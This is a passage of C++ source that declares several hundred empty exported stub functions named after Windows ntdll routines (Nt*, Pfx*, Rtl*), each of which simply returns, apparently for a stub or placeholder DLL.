extern "C" { __declspec(dllexport) void NtPrivilegeObjectAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtPrivilegedServiceAuditAlarm() { return; } }
extern "C" { __declspec(dllexport) void NtPropagationComplete() { return; } }
extern "C" { __declspec(dllexport) void NtPropagationFailed() { return; } }
extern "C" { __declspec(dllexport) void NtProtectVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtPulseEvent() { return; } }
extern "C" { __declspec(dllexport) void NtQueryAttributesFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryBootEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void NtQueryBootOptions() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDefaultLocale() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDirectoryFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDirectoryObject() { return; } }
extern "C" { __declspec(dllexport) void NtQueryDriverEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void NtQueryEaFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryEvent() { return; } }
extern "C" { __declspec(dllexport) void NtQueryFullAttributesFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationAtom() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationPort() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationThread() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationToken() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInformationWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void NtQueryInstallUILanguage() { return; } }
extern "C" { __declspec(dllexport) void NtQueryIntervalProfile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void NtQueryKey() { return; } }
extern "C" { __declspec(dllexport) void NtQueryLicenseValue() { return; } }
extern "C" { __declspec(dllexport) void NtQueryMultipleValueKey() { return; } }
extern "C" { __declspec(dllexport) void NtQueryMutant() { return; } }
extern "C" { __declspec(dllexport) void NtQueryObject() { return; } }
extern "C" { __declspec(dllexport) void NtQueryOpenSubKeys() { return; } }
extern "C" { __declspec(dllexport) void NtQueryOpenSubKeysEx() { return; } }
extern "C" { __declspec(dllexport) void NtQueryPerformanceCounter() { return; } }
extern "C" { __declspec(dllexport) void NtQueryPortInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void NtQueryQuotaInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySection() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySecurityAttributesToken() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySecurityObject() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySemaphore() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySymbolicLinkObject() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySystemEnvironmentValue() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySystemEnvironmentValueEx() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySystemInformation() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySystemInformationEx() { return; } }
extern "C" { __declspec(dllexport) void NtQuerySystemTime() { return; } }
extern "C" { __declspec(dllexport) void NtQueryTimer() { return; } }
extern "C" { __declspec(dllexport) void NtQueryTimerResolution() { return; } }
extern "C" { __declspec(dllexport) void NtQueryValueKey() { return; } }
extern "C" { __declspec(dllexport) void NtQueryVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtQueryVolumeInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtQueryWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void NtQueryWnfStateNameInformation() { return; } }
extern "C" { __declspec(dllexport) void NtQueueApcThread() { return; } }
extern "C" { __declspec(dllexport) void NtQueueApcThreadEx() { return; } }
extern "C" { __declspec(dllexport) void NtRaiseException() { return; } }
extern "C" { __declspec(dllexport) void NtRaiseHardError() { return; } }
extern "C" { __declspec(dllexport) void NtReadFile() { return; } }
extern "C" { __declspec(dllexport) void NtReadFileScatter() { return; } }
extern "C" { __declspec(dllexport) void NtReadOnlyEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtReadRequestData() { return; } }
extern "C" { __declspec(dllexport) void NtReadVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtRecoverEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtRecoverResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtRecoverTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtRegisterProtocolAddressInformation() { return; } }
extern "C" { __declspec(dllexport) void NtRegisterThreadTerminatePort() { return; } }
extern "C" { __declspec(dllexport) void NtReleaseKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void NtReleaseMutant() { return; } }
extern "C" { __declspec(dllexport) void NtReleaseSemaphore() { return; } }
extern "C" { __declspec(dllexport) void NtReleaseWorkerFactoryWorker() { return; } }
extern "C" { __declspec(dllexport) void NtRemoveIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void NtRemoveIoCompletionEx() { return; } }
extern "C" { __declspec(dllexport) void NtRemoveProcessDebug() { return; } }
extern "C" { __declspec(dllexport) void NtRenameKey() { return; } }
extern "C" { __declspec(dllexport) void NtRenameTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtReplaceKey() { return; } }
extern "C" { __declspec(dllexport) void NtReplacePartitionUnit() { return; } }
extern "C" { __declspec(dllexport) void NtReplyPort() { return; } }
extern "C" { __declspec(dllexport) void NtReplyWaitReceivePort() { return; } }
extern "C" { __declspec(dllexport) void NtReplyWaitReceivePortEx() { return; } }
extern "C" { __declspec(dllexport) void NtReplyWaitReplyPort() { return; } }
extern "C" { __declspec(dllexport) void NtRequestPort() { return; } }
extern "C" { __declspec(dllexport) void NtRequestWaitReplyPort() { return; } }
extern "C" { __declspec(dllexport) void NtResetEvent() { return; } }
extern "C" { __declspec(dllexport) void NtResetWriteWatch() { return; } }
extern "C" { __declspec(dllexport) void NtRestoreKey() { return; } }
extern "C" { __declspec(dllexport) void NtResumeProcess() { return; } }
extern "C" { __declspec(dllexport) void NtResumeThread() { return; } }
extern "C" { __declspec(dllexport) void NtRollbackComplete() { return; } }
extern "C" { __declspec(dllexport) void NtRollbackTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtRollforwardTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtSaveKey() { return; } }
extern "C" { __declspec(dllexport) void NtSaveKeyEx() { return; } }
extern "C" { __declspec(dllexport) void NtSaveMergedKeys() { return; } }
extern "C" { __declspec(dllexport) void NtSecureConnectPort() { return; } }
extern "C" { __declspec(dllexport) void NtSerializeBoot() { return; } }
extern "C" { __declspec(dllexport) void NtSetBootEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void NtSetBootOptions() { return; } }
extern "C" { __declspec(dllexport) void NtSetCachedSigningLevel() { return; } }
extern "C" { __declspec(dllexport) void NtSetContextThread() { return; } }
extern "C" { __declspec(dllexport) void NtSetDebugFilterState() { return; } }
extern "C" { __declspec(dllexport) void NtSetDefaultHardErrorPort() { return; } }
extern "C" { __declspec(dllexport) void NtSetDefaultLocale() { return; } }
extern "C" { __declspec(dllexport) void NtSetDefaultUILanguage() { return; } }
extern "C" { __declspec(dllexport) void NtSetDriverEntryOrder() { return; } }
extern "C" { __declspec(dllexport) void NtSetEaFile() { return; } }
extern "C" { __declspec(dllexport) void NtSetEvent() { return; } }
extern "C" { __declspec(dllexport) void NtSetEventBoostPriority() { return; } }
extern "C" { __declspec(dllexport) void NtSetHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtSetHighWaitLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtSetIRTimer() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationDebugObject() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationEnlistment() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationKey() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationObject() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationProcess() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationResourceManager() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationThread() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationToken() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationTransaction() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationTransactionManager() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtSetInformationWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void NtSetIntervalProfile() { return; } }
extern "C" { __declspec(dllexport) void NtSetIoCompletion() { return; } }
extern "C" { __declspec(dllexport) void NtSetIoCompletionEx() { return; } }
extern "C" { __declspec(dllexport) void NtSetLdtEntries() { return; } }
extern "C" { __declspec(dllexport) void NtSetLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtSetLowWaitHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtSetQuotaInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtSetSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void NtSetSystemEnvironmentValue() { return; } }
extern "C" { __declspec(dllexport) void NtSetSystemEnvironmentValueEx() { return; } }
extern "C" { __declspec(dllexport) void NtSetSystemInformation() { return; } }
extern "C" { __declspec(dllexport) void NtSetSystemPowerState() { return; } }
extern "C" { __declspec(dllexport) void NtSetSystemTime() { return; } }
extern "C" { __declspec(dllexport) void NtSetThreadExecutionState() { return; } }
extern "C" { __declspec(dllexport) void NtSetTimer() { return; } }
extern "C" { __declspec(dllexport) void NtSetTimerEx() { return; } }
extern "C" { __declspec(dllexport) void NtSetTimerResolution() { return; } }
extern "C" { __declspec(dllexport) void NtSetUuidSeed() { return; } }
extern "C" { __declspec(dllexport) void NtSetValueKey() { return; } }
extern "C" { __declspec(dllexport) void NtSetVolumeInformationFile() { return; } }
extern "C" { __declspec(dllexport) void NtShutdownSystem() { return; } }
extern "C" { __declspec(dllexport) void NtShutdownWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void NtSignalAndWaitForSingleObject() { return; } }
extern "C" { __declspec(dllexport) void NtSinglePhaseReject() { return; } }
extern "C" { __declspec(dllexport) void NtStartProfile() { return; } }
extern "C" { __declspec(dllexport) void NtStopProfile() { return; } }
extern "C" { __declspec(dllexport) void NtSubscribeWnfStateChange() { return; } }
extern "C" { __declspec(dllexport) void NtSuspendProcess() { return; } }
extern "C" { __declspec(dllexport) void NtSuspendThread() { return; } }
extern "C" { __declspec(dllexport) void NtSystemDebugControl() { return; } }
extern "C" { __declspec(dllexport) void NtTerminateJobObject() { return; } }
extern "C" { __declspec(dllexport) void NtTerminateProcess() { return; } }
extern "C" { __declspec(dllexport) void NtTerminateThread() { return; } }
extern "C" { __declspec(dllexport) void NtTestAlert() { return; } }
extern "C" { __declspec(dllexport) void NtThawRegistry() { return; } }
extern "C" { __declspec(dllexport) void NtThawTransactions() { return; } }
extern "C" { __declspec(dllexport) void NtTraceControl() { return; } }
extern "C" { __declspec(dllexport) void NtTraceEvent() { return; } }
extern "C" { __declspec(dllexport) void NtTranslateFilePath() { return; } }
extern "C" { __declspec(dllexport) void NtUmsThreadYield() { return; } }
extern "C" { __declspec(dllexport) void NtUnloadDriver() { return; } }
extern "C" { __declspec(dllexport) void NtUnloadKey() { return; } }
extern "C" { __declspec(dllexport) void NtUnloadKey2() { return; } }
extern "C" { __declspec(dllexport) void NtUnloadKeyEx() { return; } }
extern "C" { __declspec(dllexport) void NtUnlockFile() { return; } }
extern "C" { __declspec(dllexport) void NtUnlockVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtUnmapViewOfSection() { return; } }
extern "C" { __declspec(dllexport) void NtUnmapViewOfSectionEx() { return; } }
extern "C" { __declspec(dllexport) void NtUnsubscribeWnfStateChange() { return; } }
extern "C" { __declspec(dllexport) void NtUpdateWnfStateData() { return; } }
extern "C" { __declspec(dllexport) void NtVdmControl() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForAlertByThreadId() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForDebugEvent() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForKeyedEvent() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForMultipleObjects() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForMultipleObjects32() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForSingleObject() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForWnfNotifications() { return; } }
extern "C" { __declspec(dllexport) void NtWaitForWorkViaWorkerFactory() { return; } }
extern "C" { __declspec(dllexport) void NtWaitHighEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtWaitLowEventPair() { return; } }
extern "C" { __declspec(dllexport) void NtWorkerFactoryWorkerReady() { return; } }
extern "C" { __declspec(dllexport) void NtWriteFile() { return; } }
extern "C" { __declspec(dllexport) void NtWriteFileGather() { return; } }
extern "C" { __declspec(dllexport) void NtWriteRequestData() { return; } }
extern "C" { __declspec(dllexport) void NtWriteVirtualMemory() { return; } }
extern "C" { __declspec(dllexport) void NtYieldExecution() { return; } }
extern "C" { __declspec(dllexport) void NtdllDefWindowProc_A() { return; } }
extern "C" { __declspec(dllexport) void NtdllDefWindowProc_W() { return; } }
extern "C" { __declspec(dllexport) void NtdllDialogWndProc_A() { return; } }
extern "C" { __declspec(dllexport) void NtdllDialogWndProc_W() { return; } }
extern "C" { __declspec(dllexport) void PfxFindPrefix() { return; } }
extern "C" { __declspec(dllexport) void PfxInitialize() { return; } }
extern "C" { __declspec(dllexport) void PfxInsertPrefix() { return; } }
extern "C" { __declspec(dllexport) void PfxRemovePrefix() { return; } }
extern "C" { __declspec(dllexport) void RtlAbortRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlAbsoluteToSelfRelativeSD() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquirePebLock() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquirePrivilege() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquireReleaseSRWLockExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquireResourceExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquireResourceShared() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquireSRWLockExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlAcquireSRWLockShared() { return; } }
extern "C" { __declspec(dllexport) void RtlActivateActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlActivateActivationContextEx() { return; } }
extern "C" { __declspec(dllexport) void RtlActivateActivationContextUnsafeFast() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessAllowedAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessAllowedAceEx() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessAllowedObjectAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessDeniedAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessDeniedAceEx() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAccessDeniedObjectAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddActionToRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAtomToAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAttributeActionToRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAuditAccessAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAuditAccessAceEx() { return; } }
extern "C" { __declspec(dllexport) void RtlAddAuditAccessObjectAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddCompoundAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddIntegrityLabelToBoundaryDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlAddMandatoryAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddRefActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlAddRefMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlAddResourceAttributeAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddSIDToBoundaryDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlAddScopedPolicyIDAce() { return; } }
extern "C" { __declspec(dllexport) void RtlAddVectoredContinueHandler() { return; } }
extern "C" { __declspec(dllexport) void RtlAddVectoredExceptionHandler() { return; } }
extern "C" { __declspec(dllexport) void RtlAddressInSectionTable() { return; } }
extern "C" { __declspec(dllexport) void RtlAdjustPrivilege() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateActivationContextStack() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateAndInitializeSid() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateHandle() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlAllocateWnfSerializationGroup() { return; } }
extern "C" { __declspec(dllexport) void RtlAnsiCharToUnicodeChar() { return; } }
extern "C" { __declspec(dllexport) void RtlAnsiStringToUnicodeSize() { return; } }
extern "C" { __declspec(dllexport) void RtlAnsiStringToUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlAppendAsciizToString() { return; } }
extern "C" { __declspec(dllexport) void RtlAppendPathElement() { return; } }
extern "C" { __declspec(dllexport) void RtlAppendStringToString() { return; } }
extern "C" { __declspec(dllexport) void RtlAppendUnicodeStringToString() { return; } }
extern "C" { __declspec(dllexport) void RtlAppendUnicodeToString() { return; } }
extern "C" { __declspec(dllexport) void RtlApplicationVerifierStop() { return; } }
extern "C" { __declspec(dllexport) void RtlApplyRXact() { return; } }
extern "C" { __declspec(dllexport) void RtlApplyRXactNoFlush() { return; } }
extern "C" { __declspec(dllexport) void RtlAppxIsFileOwnedByTrustedInstaller() { return; } }
extern "C" { __declspec(dllexport) void RtlAreAllAccessesGranted() { return; } }
extern "C" { __declspec(dllexport) void RtlAreAnyAccessesGranted() { return; } }
extern "C" { __declspec(dllexport) void RtlAreBitsClear() { return; } }
extern "C" { __declspec(dllexport) void RtlAreBitsSet() { return; } }
extern "C" { __declspec(dllexport) void RtlAssert() { return; } }
extern "C" { __declspec(dllexport) void RtlAvlInsertNodeEx() { return; } }
extern "C" { __declspec(dllexport) void RtlAvlRemoveNode() { return; } }
extern "C" { __declspec(dllexport) void RtlBarrier() { return; } }
extern "C" { __declspec(dllexport) void RtlBarrierForDelete() { return; } }
extern "C" { __declspec(dllexport) void RtlCancelTimer() { return; } }
extern "C" { __declspec(dllexport) void RtlCanonicalizeDomainName() { return; } }
extern "C" { __declspec(dllexport) void RtlCharToInteger() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckForOrphanedCriticalSections() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckPortableOperatingSystem() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckRegistryKey() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckTokenCapability() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckTokenMembership() { return; } }
extern "C" { __declspec(dllexport) void RtlCheckTokenMembershipEx() { return; } }
extern "C" { __declspec(dllexport) void RtlCleanUpTEBLangLists() { return; } }
extern "C" { __declspec(dllexport) void RtlClearAllBits() { return; } }
extern "C" { __declspec(dllexport) void RtlClearBit() { return; } }
extern "C" { __declspec(dllexport) void RtlClearBits() { return; } }
extern "C" { __declspec(dllexport) void RtlCloneMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlCloneUserProcess() { return; } }
extern "C" { __declspec(dllexport) void RtlCmDecodeMemIoResource() { return; } }
extern "C" { __declspec(dllexport) void RtlCmEncodeMemIoResource() { return; } }
extern "C" { __declspec(dllexport) void RtlCommitDebugInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlCommitMemoryStream() { return; } }
extern "C" { __declspec(dllexport) void RtlCompactHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlCompareAltitudes() { return; } }
extern "C" { __declspec(dllexport) void RtlCompareMemoryUlong() { return; } }
extern "C" { __declspec(dllexport) void RtlCompareString() { return; } }
extern "C" { __declspec(dllexport) void RtlCompareUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlCompareUnicodeStrings() { return; } }
extern "C" { __declspec(dllexport) void RtlCompleteProcessCloning() { return; } }
extern "C" { __declspec(dllexport) void RtlCompressBuffer() { return; } }
extern "C" { __declspec(dllexport) void RtlComputeCrc32() { return; } }
extern "C" { __declspec(dllexport) void RtlComputeImportTableHash() { return; } }
extern "C" { __declspec(dllexport) void RtlComputePrivatizedDllName_U() { return; } }
extern "C" { __declspec(dllexport) void RtlConnectToSm() { return; } }
extern "C" { __declspec(dllexport) void RtlConsoleMultiByteToUnicodeN() { return; } }
extern "C" { __declspec(dllexport) void RtlContractHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertExclusiveToShared() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertLCIDToString() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertSharedToExclusive() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertSidToUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertToAutoInheritSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlConvertUiListToApiList() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyBitMap() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyContext() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyExtendedContext() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyLuid() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyLuidAndAttributesArray() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyMappedMemory() { return; } }
//extern "C" { __declspec(dllexport) void RtlCopyMemory() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyMemoryNonTemporal() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyMemoryStreamTo() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyOutOfProcessMemoryStreamTo() { return; } }
extern "C" { __declspec(dllexport) void RtlCopySecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlCopySid() { return; } }
extern "C" { __declspec(dllexport) void RtlCopySidAndAttributesArray() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyString() { return; } }
extern "C" { __declspec(dllexport) void RtlCopyUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateAcl() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateAndSetSD() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateBootStatusDataFile() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateBoundaryDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateEnvironment() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateEnvironmentEx() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateHashTableEx() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateProcessParameters() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateProcessParametersEx() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateProcessReflection() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateQueryDebugBuffer() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateRegistryKey() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateSecurityDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateServiceSid() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateSystemVolumeInformationFolder() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateTagHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateTimer() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateTimerQueue() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUmsCompletionList() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUmsThreadContext() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUnicodeString() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUnicodeStringFromAsciiz() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUserProcess() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUserSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUserStack() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateUserThread() { return; } }
extern "C" { __declspec(dllexport) void RtlCreateVirtualAccountSid() { return; } }
extern "C" { __declspec(dllexport) void RtlCultureNameToLCID() { return; } }
extern "C" { __declspec(dllexport) void RtlCustomCPToUnicodeN() { return; } }
extern "C" { __declspec(dllexport) void RtlCutoverTimeToSystemTime() { return; } }
extern "C" { __declspec(dllexport) void RtlDeCommitDebugInfo() { return; } }
extern "C" { __declspec(dllexport) void RtlDeNormalizeProcessParams() { return; } }
extern "C" { __declspec(dllexport) void RtlDeactivateActivationContext() { return; } }
extern "C" { __declspec(dllexport) void RtlDeactivateActivationContextUnsafeFast() { return; } }
extern "C" { __declspec(dllexport) void RtlDebugPrintTimes() { return; } }
extern "C" { __declspec(dllexport) void RtlDecodePointer() { return; } }
extern "C" { __declspec(dllexport) void RtlDecodeSystemPointer() { return; } }
extern "C" { __declspec(dllexport) void RtlDecompressBuffer() { return; } }
extern "C" { __declspec(dllexport) void RtlDecompressBufferEx() { return; } }
extern "C" { __declspec(dllexport) void RtlDecompressFragment() { return; } }
extern "C" { __declspec(dllexport) void RtlDefaultNpAcl() { return; } }
extern "C" { __declspec(dllexport) void RtlDelete() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteAce() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteAtomFromAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteBarrier() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteBoundaryDescriptor() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteCriticalSection() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteElementGenericTable() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteElementGenericTableAvl() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteElementGenericTableAvlEx() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteHashTable() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteNoSplay() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteRegistryValue() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteResource() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteSecurityObject() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteTimer() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteTimerQueue() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteTimerQueueEx() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteUmsCompletionList() { return; } }
extern "C" { __declspec(dllexport) void RtlDeleteUmsThreadContext() { return; } }
extern "C" { __declspec(dllexport) void RtlDequeueUmsCompletionListItems() { return; } }
extern "C" { __declspec(dllexport) void RtlDeregisterSecureMemoryCacheCallback() { return; } }
extern "C" { __declspec(dllexport) void RtlDeregisterWait() { return; } }
extern "C" { __declspec(dllexport) void RtlDeregisterWaitEx() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyAtomTable() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyEnvironment() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyHandleTable() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyHeap() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyMemoryBlockLookaside() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyMemoryZone() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyProcessParameters() { return; } }
extern "C" { __declspec(dllexport) void RtlDestroyQueryDebugBuffer() { return; } }
extern "C" { __declspec(dllexport) void RtlDetectHeapLeaks() { return; } }
extern "C" { __declspec(dllexport) void RtlDetermineDosPathNameType_U() { return; } }
extern "C" { __declspec(dllexport) void RtlDisableThreadProfiling() { return; } }
extern "C" { __declspec(dllexport) void RtlDllShutdownInProgress() { return; } }
extern "C" { __declspec(dllexport) void RtlDnsHostNameToComputerName() { return; } }
extern "C" { __declspec(dllexport) void RtlDoesFileExists_U() { return; } }
extern "C" { __declspec(dllexport) void RtlDosApplyFileIsolationRedirection_Ustr() { return; } }
extern "C" { __declspec(dllexport) void RtlDosPathNameToNtPathName_U() { return; } }
extern "C" { __declspec(dllexport) void RtlDosPathNameToNtPathName_U_WithStatus() { return; } }
